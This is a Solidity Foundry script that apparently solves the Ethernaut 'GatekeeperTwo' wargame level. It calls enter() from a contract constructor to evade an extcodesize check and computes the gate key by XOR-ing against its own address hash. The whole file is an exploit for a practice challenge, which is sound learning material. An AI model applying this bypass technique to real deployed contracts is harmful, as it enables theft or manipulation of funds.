// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Player {
    constructor (GatekeeperTwo _gatekeeperTwoInstance) {
        
        uint64 _gateKey = type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        _gatekeeperTwoInstance.enter(bytes8(_gateKey));
    }
}

contract GatekeeperTwoSolution is Script {

    GatekeeperTwo public gatekeeperTwoInstance = GatekeeperTwo(0xC48173bce04Cd5C9D78b40D0931Bcc24762350f3);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.logAddress(gatekeeperTwoInstance.entrant());

        Player player = new Player(gatekeeperTwoInstance);

        console.logAddress(gatekeeperTwoInstance.entrant());

        vm.stopBroadcast();
    }
}